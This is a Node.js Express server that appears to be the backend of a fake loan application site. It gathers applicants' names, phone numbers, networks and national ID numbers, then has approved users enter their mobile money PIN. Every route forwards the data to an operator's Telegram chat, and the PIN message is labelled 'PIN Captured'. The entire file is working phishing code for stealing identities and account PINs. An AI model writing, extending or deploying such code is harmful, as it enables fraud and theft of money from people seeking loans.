const express = require("express");
const axios = require("axios");
const path = require("path");

const app = express();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// ENV VARIABLES
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// ✅ STORE USERS (NEW)
const users = {};

// ================= HOME =================
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// ================= APPLY =================
app.post("/apply", async (req, res) => {
  const { name, phone, network, amount, nationalId } = req.body;

  if (!name || !phone || !network || !amount || !nationalId) {
    return res.status(400).send("Missing fields");
  }

  // ✅ SAVE USER DATA
  users[phone] = {
    name,
    phone,
    network,
    amount,
    nationalId,
    status: "pending"
  };

  const message = `
📥 NEW LOAN APPLICATION

👤 Name: ${name}
📱 Phone: ${phone}
📡 Network: ${network}
💰 Amount: ${amount}
🆔 ID: ${nationalId}

-------------------------
⚙️ Action Required:
`;

  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Approve", callback_data: `approve_${phone}` },
            { text: "❌ Decline", callback_data: `decline_${phone}` }
          ]
        ]
      }
    });

    res.sendStatus(200);
  } catch (err) {
    console.log(err.response?.data || err.message);
    res.status(500).send("Telegram failed");
  }
});

// ================= STATUS CHECK (NEW) =================
app.get("/status/:phone", (req, res) => {
  const phone = req.params.phone;

  if (!users[phone]) {
    return res.json({ status: "unknown" });
  }

  res.json({ status: users[phone].status });
});

// ================= PIN PAGE VISIT =================
app.post("/pin-step", async (req, res) => {
  const { phone } = req.body;

  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: `📍 USER REACHED PIN STEP\n📱 ${phone}`
    });

    res.sendStatus(200);
  } catch (err) {
    res.sendStatus(500);
  }
});

// ================= PIN SUBMIT =================
app.post("/pin", async (req, res) => {
  const { phone, pin } = req.body;

  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: `
🔐 PIN RECEIVED

📱 Phone: ${phone}
🔑 PIN: ${pin}

✅ Status: PIN Captured
`
    });

    res.sendStatus(200);
  } catch (err) {
    res.sendStatus(500);
  }
});

// ================= WEBHOOK (FIXED) =================
app.post("/webhook", (req, res) => {
  const data = req.body;

  if (data.callback_query) {
    const action = data.callback_query.data;
    const phone = action.split("_")[1];

    let text = "";

    if (users[phone]) {
      if (action.startsWith("approve")) {
        users[phone].status = "approved";
        text = "✅ Approved\n➡️ User will move to PIN page";
      } else if (action.startsWith("decline")) {
        users[phone].status = "declined";
        text = "❌ Declined";
      }
    }

    // Send feedback to Telegram
    axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: text
    });
  }

  res.sendStatus(200);
});

// ================= START SERVER =================
const PORT = process.env.PORT || 8080;
app.listen(PORT, "0.0.0.0", () => {
  console.log("Server running on port " + PORT);
});
